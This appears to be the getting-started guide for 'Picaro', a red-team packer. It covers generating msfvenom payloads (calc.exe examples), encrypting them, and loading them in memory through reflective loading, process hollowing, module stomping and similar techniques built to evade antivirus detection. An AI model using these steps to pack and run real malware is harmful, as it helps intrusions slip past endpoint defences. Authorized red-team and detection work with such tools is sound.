# Getting started

<p align="center">
  <img src="/card-back-512.webp" alt="Picaro joker card back" style="width:100px" />
</p>

This is the whole loop: generate a payload, write the YAML, pack it, run it and
measure the result.

:::caution[Authorized use only]
Pack only binaries you own or are explicitly permitted to test.
:::

## Recommended: Docker + the Python wrapper

The preferred way to run Picaro is the bundled Docker wrapper. It needs only
Docker and Python — nothing is installed on your machine — and the commands are
the same on Linux, macOS and Windows:

```bash
python scripts/picaro.py build payload.yaml   # builds the image on first use
python scripts/picaro.py audit dist/demo.exe
```

The container cross-compiles the Windows PE, so run the artifact on a Windows
host. Details, flags and the compose services are in the repository `README.md`.
The rest of this page shows the equivalent `cargo run -- …` commands and, under
[Requirements (local build)](#requirements-local-build), what a local build
needs instead.

## Requirements (local build)

Skip this if you use the wrapper above. To run the packer directly you need:

- **`rustc` on `PATH`** — the stub is compiled with bare `rustc`, not cargo.
  When it is missing the packer stops with instructions.
- Workspace dependencies built once (`cargo build --release` at the repo root),
  so the stub can link the `.rlib` files under `target/`.
- **Windows**, or Linux/WSL to cross-compile to the matching `-pc-windows-gnu`
  target. The stub is built for `arch: x64` or `arch: x86`, and the payload
  must match it (see [How it fits together](architecture.md)).

## 1. Generate a payload

A PE image, a DLL, a raw shellcode blob or a managed (.NET) assembly works,
in x64 or x86 (match it with `build.output.arch`). With Metasploit's
`msfvenom`:

```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f exe -o payload.exe   # a PE image
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o payload.bin   # raw shellcode
```

Do not add an msfvenom encoder (`-e`): Picaro encrypts the payload with
XChaCha20-Poly1305 and obfuscates the stub's strings, so an extra encoder only
makes the input larger.

## 2. Write the plan

A build is one schema-6 YAML document. Strict by design: unknown keys are an
error, so a typo never silently does nothing.

### PE payload

```yaml
schema: 6
name: demo

build:
  crypto:
    algo: xchacha20poly1305
    key: random
  payloads:
    implant:
      source: ./payload.exe
      format: pe
  output:
    path: ./dist/demo.exe
    arch: x64
    strip: true
    trim_paths: all

runtime:
  - technique: reflective_loading
    params: { payload: implant }
```

### Raw shellcode

```yaml
schema: 6
name: demo

build:
  crypto:
    algo: xchacha20poly1305
    key: random
  payloads:
    beacon:
      source: ./payload.bin
      format: shellcode
  output:
    path: ./dist/demo.exe
    arch: x64
    strip: true
    trim_paths: all

runtime:
  - technique: reflective_loading
    params: { payload: beacon }
```

Save it as `payload.yaml`. Input and output paths are resolved relative to the
directory you run Picaro from (the repo's examples assume the repo root).

The blocks:

- **`build.crypto`** — the default encryption for every payload (a payload may
  override it with its own `crypto` block).
- **`build.payloads`** — the named payloads an Execution step can load; `source`
  is a local path, `file://`, or an `http(s)://` URL fetched in memory.
- **`build.stub`** — optional: a custom stub template, the syscall layer and
  string obfuscation. Omitted here, so the builtin stub and the defaults apply.
- **`build.output`** — where the packed PE lands and how it is finalized.
- **`runtime`** — the ordered steps: Preparation and Control techniques plus the
  Execution techniques that run the payloads (see
  [Runtime steps](multistage.md)).

### Choosing the format and the execution technique

| `build.payloads.<name>.format` | Input | Runs with |
| --- | --- | --- |
| `pe` (default) | an executable matching `output.arch` | `reflective_loading`, or `process_hollowing` |
| `dll` | a library matching `output.arch` | `reflective_loading` (set `export` to call a function) |
| `shellcode` | a raw code blob | `reflective_loading`, or the in-process runners `execution_callbacks`, `module_stomping` and `fibers` |
| `dotnet` | a managed (.NET) assembly | `dotnet_hosting` (the stub hosts the CLR) |

`reflective_loading` maps the payload into the packed binary's own process and
handles the native formats, so it is the safe default. Three lighter in-process
runners take shellcode only and return control to the loader (so they chain in a
`runtime:` list): `execution_callbacks` (a legitimate enumeration API invokes
the payload), `module_stomping` (a signed DLL's code section is overwritten) and
`fibers` (the payload runs on a fiber). `process_hollowing` only
runs `format: pe`; it runs a full PE (imports, TLS state, entry hand-off), with
the payload's `DLL_PROCESS_ATTACH` TLS callbacks run on the main thread before
the entry point (runtime-verified on x64, 2026-10-14) — see
[Process hollowing evidence](techniques/process_hollowing.md). A managed
assembly is not native code: it needs `format: dotnet` and the `dotnet_hosting`
technique, which hosts the CLR in the stub and loads the assembly from memory
(the two imply each other, and the assembly's bitness must match
`output.arch`).

## 3. Build, run and measure

```bash
# Validate the plan and the payload without compiling anything:
python scripts/picaro.py build payload.yaml --dry-run

# Pack it:
python scripts/picaro.py build payload.yaml
```

This is the Docker wrapper from above; for a local build, use
`cargo run -- build …` instead.

`-v`/`--verbose` prints the resolved plan and per-step detail; the manifest
(`dist/demo.manifest.json`) records the artifact, payload and plan hashes.
Picaro prints a banner before every subcommand; `-q`/`--quiet` skips it.

```powershell
.\dist\demo.exe                       # run it
```

```bash
python scripts/picaro.py audit dist/demo.exe      # measure it
python scripts/picaro.py techniques list          # look around the registry
```

`audit` reports headers, sections and their entropy, imports/exports, a strings
scan (naming each flagged string and why it matched), YARA and (optionally) an
offline Defender scan.

## Rules worth remembering

- `schema: 6` is the only accepted version; an older document is rejected with a
  migration hint.
- Unknown keys are an error.
- Only Execution techniques take a `params.payload`; with two or more payloads it
  is required.
- A terminal step (`reflective_loading`/`process_ghosting` of a PE executable,
  `dotnet_hosting`) must be last.
- `build.output.arch` is `x64` or `x86`, and the payload must match it: the stub
  and the payload share one address space. Both execution techniques and the
  preparations support `x86` (see [x86 support](x86.md)); `sleep_obfuscation`,
  `stack_spoofing`, `syscalls.mode: indirect` and `api_resolution` stay
  `x64`-only, and an `x86` pipeline that needs one of them is rejected at
  validation with a message naming the technique.
- Positional CLI args after the plan path are substituted as `$arg.0$`,
  `$arg.1$`, … (and `name=value` as `$arg.name$`), so one plan can target
  several hosts.

## Where to go next

- [Plan](plan.md) — every block and field, plus the wizard.
- [Examples](examples/index.md) — the runnable plans.
- [Techniques](techniques/index.md) — what each runtime technique does and what
  it costs.
- [Loader features](features/index.md) — the stub-level configuration (syscall
  layer, API resolution, string obfuscation, payload arguments).
